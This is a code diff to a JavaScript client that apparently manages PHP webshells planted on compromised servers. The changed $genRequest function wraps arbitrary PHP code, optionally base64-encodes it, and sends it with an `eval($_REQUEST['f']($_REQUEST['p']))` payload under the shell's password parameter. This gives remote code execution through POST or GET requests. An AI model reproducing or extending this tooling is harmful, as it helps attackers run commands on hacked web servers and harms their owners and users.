@@ -1,5 +1,6 @@
 import request from './http'
 import base64 from './base64'
+import CONST from "./const_var";
 
 export default {
     $console(v) {
@@ -83,20 +84,26 @@ export default {
         }
         return shell.url + '?' + shell.pwd + '='
     },
+
     async $genRequest(shell, code, encode) {
         shell.encode = 'UTF-8'
         code = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + code
 
-        let base64Str = base64._encode(code, false)
-        // base64Str.replace(/ /g, '+')
-        base64Str = encodeURIComponent(base64Str)
 
-        let params = {f: 'base64_decode', p: base64Str, r: code}
-        params[shell.pwd] = `eval($_REQUEST['f']($_REQUEST['p']));`
-        // params[shell.pwd] = `eval(base64_decode(${base64Str}));`
+        let params = {}
+        if (shell.encodeType === CONST.ENCODE_TYPE.NONE) {
+            params[shell.pwd] = code
+        }
+        if (shell.encodeType === CONST.ENCODE_TYPE.BASE64) {
+            let base64Str = base64._encode(code, false)
+            base64Str = encodeURIComponent(base64Str)
+            params = {f: 'base64_decode', p: base64Str, r: code}
+            params[shell.pwd] = `eval($_REQUEST['f']($_REQUEST['p']));`
+            // params[shell.pwd] = `eval(base64_decode(${base64Str}));`
+        }
 
-        // console.log(params)
-        if (shell.requestType === 1) {
+
+        if (shell.requestType === CONST.REQUEST_TYPE.POST) {
             return request(shell.url, params, {}, 'POST')
         }
         return request(shell.url, {}, params)
